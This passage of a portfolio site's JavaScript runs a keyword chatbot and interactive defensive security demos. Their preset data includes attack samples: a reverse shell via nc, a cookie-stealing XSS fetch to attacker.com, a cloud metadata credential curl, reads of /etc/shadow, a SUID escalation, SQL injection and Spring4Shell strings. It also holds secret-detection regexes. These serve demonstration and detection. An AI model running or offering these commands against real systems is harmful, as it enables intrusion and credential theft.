      answer: "**GitSLSA** is my SLSA Level 3 Software Supply Chain Security Pipeline. It generates verifiable SPDX Software Bill of Materials (SBOMs) using Syft, keylessly signs container images via Cosign and Sigstore OIDC, and enforces cryptographic admission gates at deployment time."
    },
    {
      keywords: ["haque and sons", "startup", "haque", "sons", "testbed", "collabsheets", "proresume", "nestfy"],
      answer: "**Haque And Sons** (`haqueandsons.vercel.app`) is my personal software venture where I shipped 3 production SaaS applications (CollabSheets, ProResume-Builder, Nestfy). I used it as the real-world production testbed for rolling out GitShield, GitSLSA, and KubeShield — proving that zero-trust security and sub-30s CI build velocity can thrive together."
    },
    {
      keywords: ["hire", "why hire", "placement", "skills", "job", "intern", "role", "looking"],
      answer: "I bring a dual advantage to DevSecOps: I have **built & shipped production SaaS applications** (React/Next.js/Node/PostgreSQL) *and* engineered **automated security tooling & system defense**. I don't treat security as an auditor's checklist; I embed automated SAST, container checks, and least-privilege boundaries directly into developer pipelines."
    },
    {
      keywords: ["sentinel", "daemon", "firewall", "iptables", "brute force", "host defense"],
      answer: "**Sentinel Daemon** is my systemd-managed Python daemon that tails Linux auth logs in real-time with zero human in the loop. It correlates failed login bursts using a regex state machine and programmatically drops attacker IPs directly in the kernel via iptables, averaging 1.8ms detection-to-drop latency."
    },
    {
      keywords: ["philosophy", "shift left", "ci/cd", "devsecops", "security"],
      answer: "My philosophy is **'Shifting Security Left'** — validating infrastructure and source code before it reaches production. Security should be a built-in infrastructure boundary (pre-commit hooks, container CVE scanning, SAST rules, cryptographic SLSA provenance), not a late-stage patch applied after an incident."
    },
    {
      keywords: ["irus", "ai", "platform", "chat"],
      answer: "**Irus AI** is a production-grade personal AI assistant platform deployed with a hardened DevSecOps CI/CD pipeline running Gitleaks, Bandit, pip-audit, Trivy, and Pytest. It supports streaming LLM chat, live web search, memory, and in-memory document intelligence."
    },
    {
      keywords: ["contact", "email", "reach", "hire", "linkedin", "phone"],
      answer: "You can reach Nejamul via the **Contact Form** on this site, or directly connect via LinkedIn at `linkedin.com/in/NejamulHaque` and GitHub at `github.com/NejamulHaque`."
    }
  ];

  function openCopilot() {
    modal.classList.add("open");
    setTimeout(() => input?.focus(), 150);
    CyberAudio.play("blip");
  }
  function closeCopilot() {
    modal.classList.remove("open");
  }

  fab.addEventListener("click", openCopilot);
  if (closeBtn) closeBtn.addEventListener("click", closeCopilot);

  function appendMessage(text, isUser = false) {
    const msg = document.createElement("div");
    msg.className = `copilot-msg ${isUser ? "user" : "bot"}`;
    msg.innerHTML = `
      <div class="msg-avatar"><i class="fa-solid ${isUser ? 'fa-user' : 'fa-robot'}"></i></div>
      <div class="msg-bubble">${text}</div>
    `;
    msgContainer.appendChild(msg);
    msgContainer.scrollTop = msgContainer.scrollHeight;
    return msg;
  }

  function handleQuery(query) {
    const q = query.trim().toLowerCase();
    if (!q) return;
    appendMessage(query, true);
    CyberAudio.play("click");

    let reply = "I'm trained on Nejamul's DevSecOps portfolio. You can ask about his **UP Police Cyber Internship**, **Sentinel Daemon**, **CI/CD security philosophy**, or **2026-2027 placement readiness**!";
    for (const k of KNOWLEDGE) {
      if (k.keywords.some(kw => q.includes(kw))) {
        reply = k.answer;
        break;
      }
    }

    // Stream typewriter effect for bot reply
    setTimeout(() => {
      const botMsg = appendMessage("", false);
      const bubble = botMsg.querySelector(".msg-bubble");
      let idx = 0;
      CyberAudio.play("blip");
      const interval = setInterval(() => {
        idx += 3;
        bubble.innerHTML = reply.slice(0, idx);
        msgContainer.scrollTop = msgContainer.scrollHeight;
        if (idx >= reply.length) {
          clearInterval(interval);
          bubble.innerHTML = reply.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>');
        }
      }, 15);
    }, 250);
  }

  if (form) {
    form.addEventListener("submit", (e) => {
      e.preventDefault();
      const val = input.value;
      input.value = "";
      handleQuery(val);
    });
  }

  if (promptsWrap) {
    promptsWrap.addEventListener("click", (e) => {
      const chip = e.target.closest(".prompt-chip");
      if (chip) handleQuery(chip.dataset.query);
    });
  }
})();

// ============================================================
//  FEATURE: MAGNETIC CURSOR HOVER PHYSICS
// ============================================================
(function initMagneticElements() {
  const isTouch = window.matchMedia("(hover: none)").matches;
  const isReduced = window.matchMedia("(prefers-reduced-motion: reduce)").matches;
  if (isTouch || isReduced) return;

  const targets = document.querySelectorAll(".btn, .palette-toggle, .theme-toggle, .sound-toggle, .copilot-fab, .gate-chip, .filter-btn");

  targets.forEach(el => {
    el.classList.add("magnetic");
    el.addEventListener("mousemove", (e) => {
      const rect = el.getBoundingClientRect();
      const x = e.clientX - (rect.left + rect.width / 2);
      const y = e.clientY - (rect.top + rect.height / 2);
      el.style.transform = `translate(${x * 0.22}px, ${y * 0.22}px)`;
    });
    el.addEventListener("mouseleave", () => {
      el.style.transform = "translate(0, 0)";
    });
  });
})();

// ============================================================
//  FEATURE: LIVE SECURITY TOOL SANDBOXES (GitShield & Threat Parser)
// ============================================================
(function initSecuritySandboxes() {
  const tabs = document.querySelectorAll(".sandbox-tab");
  const panes = document.querySelectorAll(".sandbox-pane");
  if (tabs.length === 0) return;

  // Tab switching (Supports gitshield, threatparser, kubeshield, gitslsa)
  tabs.forEach(tab => {
    tab.addEventListener("click", () => {
      tabs.forEach(t => t.classList.remove("active"));
      panes.forEach(p => p.classList.remove("active"));
      tab.classList.add("active");
      
      const paneMap = {
        gitshield: "paneGitshield",
        threatparser: "paneThreatparser",
        kubeshield: "paneKubeshield",
        gitslsa: "paneGitslsa"
      };
      const targetPane = document.getElementById(paneMap[tab.dataset.tab]);
      if (targetPane) targetPane.classList.add("active");
      CyberAudio.play("click");
    });
  });

  // --- GITSHIELD SECRET SCANNER ---
  const gitInput = document.getElementById("gitshieldInput");
  const entropyVal = document.getElementById("entropyValue");
  const entropyFill = document.getElementById("entropyFill");
  const entropyBadge = document.getElementById("entropyBadge");
  const statusBox = document.getElementById("interceptStatus");
  const statusTitle = document.getElementById("statusTitle");
  const statusDesc = document.getElementById("statusDesc");
  const payloadChips = document.querySelectorAll(".payload-chip");

  const PAYLOADS = {
    aws: "export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\nexport AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    rsa: "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0Y5Q0V1hM4G1p7K...[REDACTED PRIVATE KEY]...\n-----END RSA PRIVATE KEY-----",
    jwt: "const token = \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\";",
    slack: "const WEBHOOK = \"https://hooks.slack.com/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX\";",
    clean: "function calculateTax(amount, rate) {\n  return Number((amount * rate).toFixed(2));\n}"
  };

  // Shannon Entropy formula: H = -sum(p * log2(p))
  function calcShannonEntropy(str) {
    if (!str || str.length === 0) return 0;
    const map = {};
    for (let i = 0; i < str.length; i++) {
      const c = str[i];
      map[c] = (map[c] || 0) + 1;
    }
    let entropy = 0;
    const len = str.length;
    for (const c in map) {
      const p = map[c] / len;
      entropy -= p * Math.log2(p);
    }
    return entropy;
  }

  function evaluateGitshield() {
    if (!gitInput) return;
    const val = gitInput.value;
    const entropy = calcShannonEntropy(val);
    if (entropyVal) entropyVal.textContent = entropy.toFixed(2);

    // Entropy bar (max scale ~6.0 bits for code)
    const pct = Math.min(100, Math.round((entropy / 5.5) * 100));
    if (entropyFill) entropyFill.style.width = `${pct}%`;

    // Secret pattern matchers
    const hasAws = /AKIA[0-9A-Z]{16}/.test(val) || /aws_secret_access_key/i.test(val);
    const hasRsa = /-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----/.test(val);
    const hasSlack = /https:\/\/hooks\.slack\.com\/services\/T[0-9A-Za-z]+\/B[0-9A-Za-z]+\/[0-9A-Za-z]+/.test(val);
    const hasJwt = /eyJ[A-Za-z0-9-_=]+\.eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_.+/=]*/.test(val);
    const isHighEntropy = entropy > 4.4 && val.length > 20;

    const isBlocked = hasAws || hasRsa || hasSlack || hasJwt || (isHighEntropy && !val.includes("function"));

    if (isBlocked) {
      if (statusBox) statusBox.className = "intercept-status blocked";
      if (entropyBadge) { entropyBadge.className = "entropy-badge danger"; entropyBadge.textContent = "High Risk"; }
      if (statusTitle) statusTitle.textContent = "Git Hook Status: BLOCKED (Exit Code 1)";
      
      let reason = "High-entropy credential detected.";
      if (hasAws) reason = "Matched AWS IAM Access Key signature.";
      else if (hasRsa) reason = "Matched Unencrypted RSA Private Key block.";
      else if (hasSlack) reason = "Matched Incoming Slack Webhook URL.";
      else if (hasJwt) reason = "Matched High-Entropy JWT Authentication Token.";
      
      if (statusDesc) statusDesc.textContent = `Pre-commit validation rejected commit buffer: ${reason}`;
    } else {
      if (statusBox) statusBox.className = "intercept-status";
      if (entropyBadge) { entropyBadge.className = "entropy-badge"; entropyBadge.textContent = "Safe"; }
      if (statusTitle) statusTitle.textContent = "Git Hook Status: CLEAN (Exit Code 0)";
      if (statusDesc) statusDesc.textContent = "No credentials, plaintext secrets, or dangerous tokens found.";
    }
  }

  if (gitInput) {
    gitInput.addEventListener("input", evaluateGitshield);
  }

  payloadChips.forEach(chip => {
    chip.addEventListener("click", () => {
      const type = chip.dataset.payload;
      if (gitInput && PAYLOADS[type]) {
        gitInput.value = PAYLOADS[type];
        evaluateGitshield();
        CyberAudio.play("blip");
      }
    });
  });

  // --- THREAT LOG PARSER SANDBOX ---
  const logInput = document.getElementById("threatlogInput");
  const runParserBtn = document.getElementById("runThreatParserBtn");
  const siemOut = document.getElementById("siemOutput");
  const logChips = document.querySelectorAll(".log-chip");

  const LOG_PRESETS = {
    sqli: '198.51.100.42 - - [28/Aug/2026:14:22:01 +0000] "GET /api/v1/users?id=1%20UNION%20SELECT%20username,password_hash%20FROM%20users-- HTTP/1.1" 403 241 "https://example.com" "sqlmap/1.6.12#stable"',
    traversal: '203.0.113.88 - - [28/Aug/2026:14:23:15 +0000] "GET /download?file=../../../../etc/shadow HTTP/1.1" 404 182 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',
    xss: '185.220.101.5 - - [28/Aug/2026:14:25:40 +0000] "POST /comments HTTP/1.1" 400 312 "https://example.com/blog" "<script>fetch(\'https://attacker.com/steal?c=\'+document.cookie)</script>"',
    spring: '45.33.32.156 - - [28/Aug/2026:14:27:02 +0000] "POST /helloworld/greeting HTTP/1.1" 500 523 "-" "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di"',
    clean: '93.184.216.34 - - [28/Aug/2026:14:30:10 +0000] "GET /static/styles.css HTTP/2.0" 200 4821 "https://example.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"'
  };

  if (logInput) logInput.value = LOG_PRESETS.sqli;

  logChips.forEach(chip => {
    chip.addEventListener("click", () => {
      logChips.forEach(c => c.classList.remove("active"));
      chip.classList.add("active");
      const key = chip.dataset.log;
      if (logInput && LOG_PRESETS[key]) {
        logInput.value = LOG_PRESETS[key];
        CyberAudio.play("click");
      }
    });
  });

  function parseLogEntry() {
    if (!logInput || !siemOut) return;
    const raw = logInput.value;

    let attackType = "Normal Ingress Traffic";
    let severity = "LOW";
    let mitreId = "N/A";
    let action = "ALLOW";

    if (/UNION.*SELECT|SELECT.*FROM/i.test(raw)) {
      attackType = "SQL Injection (CWE-89)";
      severity = "CRITICAL";
      mitreId = "T1190 - Exploit Public-Facing Application";
      action = "KERNEL DROP & IP ISOLATION";
    } else if (/\.\.\/|\/etc\/passwd|\/etc\/shadow/i.test(raw)) {
      attackType = "Path Traversal (CWE-22)";
      severity = "HIGH";
      mitreId = "T1083 - File and Directory Discovery";
      action = "REJECT & RATE LIMIT";
    } else if (/<script|document\.cookie/i.test(raw)) {
      attackType = "Cross-Site Scripting (CWE-79)";
      severity = "HIGH";
      mitreId = "T1059.007 - JavaScript Execution";
      action = "WAF BLOCK";
    } else if (/class\.module\.classLoader/i.test(raw)) {
      attackType = "Spring4Shell RCE (CVE-2022-22965)";
      severity = "CRITICAL";
      mitreId = "T1210 - Exploitation of Remote Services";
      action = "INSTANT KERNEL IPTABLES BAN";
    }

    const ipMatch = raw.match(/^([0-9.]+)/);
    const ip = ipMatch ? ipMatch[1] : "Unknown";

    const report = {
      "@timestamp": new Date().toISOString(),
      "event_source": "ThreatIntelligenceLogParser_v2",
      "client_ip": ip,
      "threat_classification": attackType,
      "severity_score": severity,
      "mitre_att_ck": mitreId,
      "automated_defense_action": action,
      "log_raw": raw.slice(0, 100) + "..."
    };

    siemOut.innerHTML = `<code>${JSON.stringify(report, null, 2)}</code>`;
    CyberAudio.play("success");
  }

  if (runParserBtn) runParserBtn.addEventListener("click", parseLogEntry);

  // --- KUBESHIELD K8S ADMISSION CONTROLLER SANDBOX ---
  const k8sInput = document.getElementById("k8sInput");
  const k8sStatusBox = document.getElementById("k8sStatusBox");
  const k8sStatusTitle = document.getElementById("k8sStatusTitle");
  const k8sStatusDesc = document.getElementById("k8sStatusDesc");
  const k8sOutput = document.getElementById("k8sOutput");
  const runKubeShieldBtn = document.getElementById("runKubeShieldBtn");
  const k8sChips = document.querySelectorAll(".k8s-chip");

  const K8S_PRESETS = {
    privileged: `apiVersion: v1\nkind: Pod\nmetadata:\n  name: payment-worker-pod\nspec:\n  containers:\n  - name: worker\n    image: haqueandsons/worker:v1.2.0\n    securityContext:\n      privileged: true\n      runAsUser: 0`,
    mutable: `apiVersion: v1\nkind: Pod\nmetadata:\n  name: api-service\nspec:\n  containers:\n  - name: api\n    image: haqueandsons/api:latest`,
    nolimits: `apiVersion: v1\nkind: Pod\nmetadata:\n  name: auth-processor\nspec:\n  containers:\n  - name: auth\n    image: haqueandsons/auth:v2.1.0\n    # Missing spec.containers[0].resources.limits`,
    hardened: `apiVersion: v1\nkind: Pod\nmetadata:\n  name: collab-realtime-engine\nspec:\n  securityContext:\n    runAsNonRoot: true\n    runAsUser: 10001\n    seccompProfile:\n      type: RuntimeDefault\n  containers:\n  - name: engine\n    image: haqueandsons/collab@sha256:7f83b1657ff1...\n    securityContext:\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n      capabilities:\n        drop: ["ALL"]\n    resources:\n      limits: { cpu: "500m", memory: "256Mi" }\n      requests: { cpu: "100m", memory: "64Mi" }`
  };

  if (k8sInput) k8sInput.value = K8S_PRESETS.privileged;

  k8sChips.forEach(chip => {
    chip.addEventListener("click", () => {
      k8sChips.forEach(c => c.classList.remove("active"));
      chip.classList.add("active");
      const key = chip.dataset.k8s;
      if (k8sInput && K8S_PRESETS[key]) {
        k8sInput.value = K8S_PRESETS[key];
        CyberAudio.play("click");
      }
    });
  });

  function evaluateKubeShield() {
    if (!k8sInput || !k8sOutput) return;
    const val = k8sInput.value;

    const hasPrivileged = /privileged:\s*true/i.test(val) || /runAsUser:\s*0/i.test(val);
    const hasLatest = /:latest/i.test(val);
    const lacksLimits = !/limits:/i.test(val) && !/requests:/i.test(val);

    if (hasPrivileged) {
      if (k8sStatusBox) k8sStatusBox.className = "intercept-status blocked";
      if (k8sStatusTitle) k8sStatusTitle.textContent = "Admission Webhook: REJECTED (CIS-5.2.1 Violation)";
      if (k8sStatusDesc) k8sStatusDesc.textContent = "Pod rejected: running as root (UID 0) or privileged: true is forbidden under Pod Security Standards.";
      
      const response = {
        "apiVersion": "admission.k8s.io/v1",
        "kind": "AdmissionReview",
        "response": {
          "uid": "705ab4f5-6393-11e8-b7cc-42010a800002",
          "allowed": false,
          "status": {
            "code": 403,
            "message": "KubeShield Admission Policy [Deny-Privileged-Root]: Container 'worker' cannot run as root UID 0 or request privileged kernel capabilities."
          }
        }
      };
      k8sOutput.innerHTML = `<code>${JSON.stringify(response, null, 2)}</code>`;
      CyberAudio.play("alert");
    } else if (hasLatest) {
      if (k8sStatusBox) k8sStatusBox.className = "intercept-status blocked";
      if (k8sStatusTitle) k8sStatusTitle.textContent = "Admission Webhook: REJECTED (Supply Chain Tag Policy)";
      if (k8sStatusDesc) k8sStatusDesc.textContent = "Mutable tag ':latest' violates SLSA provenance tracking. Must use immutable digest @sha256 or semantic version.";
      
      const response = {
        "apiVersion": "admission.k8s.io/v1",
        "kind": "AdmissionReview",
        "response": {
          "uid": "812cd9a0-6393-11e8-b7cc-42010a800002",
          "allowed": false,
          "status": {
            "code": 403,
            "message": "KubeShield Policy [Deny-Latest-Tag]: Container 'api' uses mutable ':latest' tag. Pinned SHA-256 digest required."
          }
        }
      };
      k8sOutput.innerHTML = `<code>${JSON.stringify(response, null, 2)}</code>`;
      CyberAudio.play("alert");
    } else if (lacksLimits) {
      if (k8sStatusBox) k8sStatusBox.className = "intercept-status";
      if (k8sStatusTitle) k8sStatusTitle.textContent = "Admission Webhook: APPROVED WITH AUTO-MUTATION";
      if (k8sStatusDesc) k8sStatusDesc.textContent = "Mutating webhook injected default resource limits (500m/256Mi) and readOnlyRootFilesystem.";
      
      const patch = [
        { "op": "add", "path": "/spec/containers/0/resources", "value": { "limits": { "cpu": "500m", "memory": "256Mi" }, "requests": { "cpu": "100m", "memory": "64Mi" } } },
        { "op": "add", "path": "/spec/containers/0/securityContext", "value": { "readOnlyRootFilesystem": true, "runAsNonRoot": true, "runAsUser": 10001 } }
      ];
      const response = {
        "apiVersion": "admission.k8s.io/v1",
        "kind": "AdmissionReview",
        "response": {
          "allowed": true,
          "patchType": "JSONPatch",
          "patch": btoa(JSON.stringify(patch))
        }
      };
      k8sOutput.innerHTML = `<code>// Decoded JSONPatch Mutation Applied by KubeShield:\n${JSON.stringify(patch, null, 2)}</code>`;
      CyberAudio.play("success");
    } else {
      if (k8sStatusBox) k8sStatusBox.className = "intercept-status";
      if (k8sStatusTitle) k8sStatusTitle.textContent = "Admission Webhook: APPROVED (100% Compliant)";
      if (k8sStatusDesc) k8sStatusDesc.textContent = "Pod manifest meets all CIS Benchmark & Pod Security Standards (Restricted profile).";
      
      const response = {
        "apiVersion": "admission.k8s.io/v1",
        "kind": "AdmissionReview",
        "response": {
          "allowed": true,
          "status": { "code": 200, "message": "Manifest fully compliant with CIS Kubernetes Restricted baseline." }
        }
      };
      k8sOutput.innerHTML = `<code>${JSON.stringify(response, null, 2)}</code>`;
      CyberAudio.play("success");
    }
  }

  if (runKubeShieldBtn) runKubeShieldBtn.addEventListener("click", evaluateKubeShield);

  // --- GITSLSA COSIGN & SBOM SANDBOX ---
  const slsaDigest = document.getElementById("slsaDigest");
  const slsaBadge = document.getElementById("slsaBadge");
  const slsaOutput = document.getElementById("slsaOutput");
  const runSlsaBtn = document.getElementById("runSlsaBtn");
  const slsaChips = document.querySelectorAll(".slsa-chip");

  const SLSA_PRESETS = {
    haqueapi: {
      digest: "sha256:7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069",
      badge: "SLSA Level 3 Verified",
      badgeClass: "entropy-badge",
      attestation: {
        "schemaVersion": "https://in-toto.io/Statement/v1",
        "predicateType": "https://slsa.dev/provenance/v1",
        "subject": [
          {
            "name": "ghcr.io/haqueandsons/api",
            "digest": { "sha256": "7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069" }
          }
        ],
        "predicate": {
          "buildDefinition": {
            "buildType": "https://actions.github.com/workflow/v1",
            "externalParameters": { "repository": "https://github.com/NejamulHaque/haqueandsons-api" }
          },
          "runDetails": {
            "builder": { "id": "https://github.com/slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@v2.0.0" },
            "metadata": { "completeness": { "parameters": true, "environment": true, "materials": true } }
          }
        },
        "sbom_summary": {
          "format": "SPDX-2.3",
          "total_packages": 42,
          "vulnerabilities": { "CRITICAL": 0, "HIGH": 0, "MEDIUM": 0 },
          "signed_by": "Cosign Fulcio OIDC CA (Keyless)"
        }
      }
    },
    haqueauth: {
      digest: "sha256:8c5b3691a32b6e1470e8a719917300304313dfdc98a2e1d054e0193ecb001a1c",
      badge: "SLSA Level 3 Verified",
      badgeClass: "entropy-badge",
      attestation: {
        "schemaVersion": "https://in-toto.io/Statement/v1",
        "predicateType": "https://slsa.dev/provenance/v1",
        "subject": [
          {
            "name": "ghcr.io/haqueandsons/auth",
            "digest": { "sha256": "8c5b3691a32b6e1470e8a719917300304313dfdc98a2e1d054e0193ecb001a1c" }
          }
        ],
        "sbom_summary": {
          "format": "SPDX-2.3",
          "total_packages": 28,
          "vulnerabilities": { "CRITICAL": 0, "HIGH": 0, "MEDIUM": 0 },
          "signed_by": "Cosign Fulcio OIDC CA (Keyless)"
        }
      }
    },
    untrusted: {
      digest: "sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
      badge: "UNTRUSTED / NO ATTESTATION",
      badgeClass: "entropy-badge danger",
      attestation: {
        "error": "COSIGN_VERIFICATION_FAILED",
        "status": "REJECTED_BY_ADMISSION_POLICY",
        "reason": "No valid Sigstore / Fulcio cryptographic signature found for image digest sha256:e3b0c44298... Admission controller denied pod deployment."
      }
    }
  };

  let currentArtifact = "haqueapi";

  slsaChips.forEach(chip => {
    chip.addEventListener("click", () => {
      slsaChips.forEach(c => c.classList.remove("active"));
      chip.classList.add("active");
      currentArtifact = chip.dataset.artifact;
      const data = SLSA_PRESETS[currentArtifact];
      if (data) {
        if (slsaDigest) slsaDigest.textContent = data.digest;
        if (slsaBadge) {
          slsaBadge.textContent = data.badge;
          slsaBadge.className = data.badgeClass;
        }
        CyberAudio.play("click");
      }
    });
  });

  function verifySlsa() {
    if (!slsaOutput) return;
    const data = SLSA_PRESETS[currentArtifact];
    if (!data) return;

    slsaOutput.innerHTML = `<code>${JSON.stringify(data.attestation, null, 2)}</code>`;
    if (currentArtifact === "untrusted") {
      CyberAudio.play("alert");
    } else {
      CyberAudio.play("success");
    }
  }

  if (runSlsaBtn) runSlsaBtn.addEventListener("click", verifySlsa);

  // --- eBPF KERNEL SYSCALL PROBE SANDBOX ---
  const ebpfInput = document.getElementById("ebpfCommandInput");
  const ebpfStatusBox = document.getElementById("ebpfStatusBox");
  const ebpfStatusTitle = document.getElementById("ebpfStatusTitle");
  const ebpfStatusDesc = document.getElementById("ebpfStatusDesc");
  const ebpfOutput = document.getElementById("ebpfOutput");
  const runEbpfBtn = document.getElementById("runEbpfBtn");
  const ebpfChips = document.querySelectorAll(".ebpf-chip");

  const EBPF_ATTACKS = {
    shadow: {
      cmd: "cat /etc/shadow",
      title: "eBPF Policy Triggered: UNAUTHORIZED_SENSITIVE_FILE_ACCESS",
      desc: "Process attempted read on /etc/shadow from unprivileged container namespace.",
      boxClass: "intercept-status blocked",
      trace: {
        "event_type": "KPROBE_TRACEPOINT_EVENT",
        "probe": "tracepoint/syscalls/sys_enter_openat",
        "timestamp_ns": Date.now() * 1000000,
        "container_id": "k8s_api_haqueandsons_7f83b165",
        "process": { "pid": 4821, "ppid": 1204, "comm": "cat", "uid": 10001 },
        "syscall_args": { "dfd": -100, "filename": "/etc/shadow", "flags": "O_RDONLY" },
        "ebpf_action": "PROCESS_SIGKILL",
        "kernel_latency": "0.28ms",
        "mitre_technique": "T1003.008 - /etc/passwd and /etc/shadow"
      }
    },
    revshell: {
      cmd: "nc -e /bin/sh 198.51.100.42 4444",
      title: "eBPF Policy Triggered: REVERSE_SHELL_INTERCEPTED",
      desc: "Unauthorized interactive shell binary spawned with socket descriptor attachment.",
      boxClass: "intercept-status blocked",
      trace: {
        "event_type": "KPROBE_TRACEPOINT_EVENT",
        "probe": "tracepoint/syscalls/sys_enter_connect",
        "timestamp_ns": Date.now() * 1000000,
        "container_id": "k8s_web_haqueandsons_8c5b3691",
        "process": { "pid": 5109, "ppid": 4821, "comm": "nc", "uid": 10001 },
        "socket_target": { "ip": "198.51.100.42", "port": 4444, "proto": "TCP" },
        "ebpf_action": "SOCKET_DROP_AND_SIGKILL",
        "kernel_latency": "0.31ms",
        "mitre_technique": "T1059.004 - Unix Shell"
      }
    },
    metadata: {
      cmd: "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/",
      title: "eBPF Policy Triggered: CLOUD_METADATA_SSRF_PROBE",
      desc: "Container attempted outbound connection to AWS Link-Local 169.254.169.254 metadata service.",
      boxClass: "intercept-status blocked",
      trace: {
        "event_type": "TC_EBPF_NETWORK_FILTER",
        "probe": "tc_egress_redirect",
        "timestamp_ns": Date.now() * 1000000,
        "container_id": "k8s_auth_haqueandsons_1204a9f",
        "process": { "pid": 5410, "comm": "curl", "uid": 10001 },
        "destination": "169.254.169.254:80",
        "ebpf_action": "PACKET_DROP_SILENT",
        "kernel_latency": "0.19ms",
        "mitre_technique": "T1552.005 - Cloud Instance Metadata API"
      }
    },
    suid: {
      cmd: "chmod u+s /bin/bash",
      title: "eBPF Policy Triggered: PRIVILEGE_ESCALATION_ATTEMPT",
      desc: "Process attempted SUID bit manipulation (04755) in violation of read-only security context.",
      boxClass: "intercept-status blocked",
      trace: {
        "event_type": "KPROBE_TRACEPOINT_EVENT",
        "probe": "tracepoint/syscalls/sys_enter_fchmodat",
        "timestamp_ns": Date.now() * 1000000,
        "container_id": "k8s_worker_haqueandsons_5109b8",
        "process": { "pid": 6012, "comm": "chmod", "uid": 10001 },
        "mode_requested": "04755 (SUID)",
        "ebpf_action": "DENY_SYSCALL_EPERM",
        "kernel_latency": "0.22ms",
        "mitre_technique": "T1548.001 - Setuid and Setgid"
      }
    },
    clean: {
      cmd: "nginx -g 'daemon off;'",
      title: "eBPF Trace: CLEAN_CONTAINER_WORKER_EXEC",
      desc: "Legitimate parent process spawned unprivileged worker processes. All syscalls within baseline profile.",
      boxClass: "intercept-status",
      trace: {
        "event_type": "KPROBE_TRACEPOINT_EVENT",
        "probe": "tracepoint/syscalls/sys_enter_execve",
        "timestamp_ns": Date.now() * 1000000,
        "container_id": "k8s_ingress_haqueandsons_prod",
        "process": { "pid": 1, "comm": "nginx", "uid": 10001 },
        "ebpf_action": "ALLOW_AUDIT_LOGGED",
        "kernel_latency": "0.12ms",
        "security_profile": "CIS_K8S_RESTRICTED_PASS"
      }
    }
  };

  let currentAttack = "shadow";
  if (ebpfInput) ebpfInput.value = EBPF_ATTACKS.shadow.cmd;

  ebpfChips.forEach(chip => {
    chip.addEventListener("click", () => {
      ebpfChips.forEach(c => c.classList.remove("active"));
      chip.classList.add("active");
      currentAttack = chip.dataset.attack;
      if (ebpfInput && EBPF_ATTACKS[currentAttack]) {
        ebpfInput.value = EBPF_ATTACKS[currentAttack].cmd;
        CyberAudio.play("click");
      }
    });
  });

  function runEbpfProbe() {
    if (!ebpfOutput) return;
    const data = EBPF_ATTACKS[currentAttack];
    if (!data) return;

    if (ebpfStatusBox) ebpfStatusBox.className = data.boxClass;
    if (ebpfStatusTitle) ebpfStatusTitle.textContent = data.title;
    if (ebpfStatusDesc) ebpfStatusDesc.textContent = data.desc;

    ebpfOutput.innerHTML = `<code>${JSON.stringify(data.trace, null, 2)}</code>`;
    if (currentAttack === "clean") {
      CyberAudio.play("success");
    } else {
      CyberAudio.play("alert");
    }
  }

  if (runEbpfBtn) runEbpfBtn.addEventListener("click", runEbpfProbe);

  // --- TERRAFORM / OPENTOFU IAC LINTER & AUTO-FIXER SANDBOX ---
  const tfInput = document.getElementById("tfCodeInput");
  const tfStatusBox = document.getElementById("tfStatusBox");
  const tfStatusTitle = document.getElementById("tfStatusTitle");
  const tfStatusDesc = document.getElementById("tfStatusDesc");
  const tfOutput = document.getElementById("tfOutput");
  const runTfScanBtn = document.getElementById("runTfScanBtn");
  const autoRemediateBtn = document.getElementById("autoRemediateTfBtn");
  const tfChips = document.querySelectorAll(".tf-chip");

  const TF_PRESETS = {
    s3_public: {
      raw: `resource "aws_s3_bucket" "prod_storage" {
  bucket = "haqueandsons-customer-records"
  acl    = "public-read" # DANGEROUS: Public ACL enabled

  tags = {
    Environment = "production"
  }
}`,
      findings: {
        "iac_scanner": "tfsec_checkov_engine_v3.2",
        "violations_detected": 3,
        "results": [
          { "rule": "CKV_AWS_20", "severity": "CRITICAL", "desc": "S3 bucket has an ACL defined allowing public READ access." },
          { "rule": "CKV_AWS_19", "severity": "HIGH", "desc": "Ensure S3 bucket has server-side KMS encryption enabled (SSE-KMS)." },
          { "rule": "CKV_AWS_21", "severity": "HIGH", "desc": "Ensure S3 bucket has versioning enabled to protect against ransomware/loss." }
        ]
      },
      remediated: `resource "aws_s3_bucket" "prod_storage" {
  bucket = "haqueandsons-customer-records"

  tags = {
    Environment = "production"
    Compliance  = "CIS-AWS-1.4"
  }
}

resource "aws_s3_bucket_public_access_block" "prod_storage_block" {
  bucket                  = aws_s3_bucket.prod_storage.id
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

resource "aws_s3_bucket_server_side_encryption_configuration" "prod_storage_crypto" {
  bucket = aws_s3_bucket.prod_storage.id
  rule {
    apply_server_side_encryption_by_default {
      sse_algorithm = "aws:kms"
    }
  }
}

resource "aws_s3_bucket_versioning" "prod_storage_ver" {
  bucket = aws_s3_bucket.prod_storage.id
  versioning_configuration {
    status = "Enabled"
  }
}`
    },
    sg_open: {
      raw: `resource "aws_security_group" "ssh_ingress" {
  name        = "bastion-ssh"
  description = "Allow inbound SSH"

  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"] # DANGEROUS: SSH exposed to entire internet
  }
}`,
      findings: {
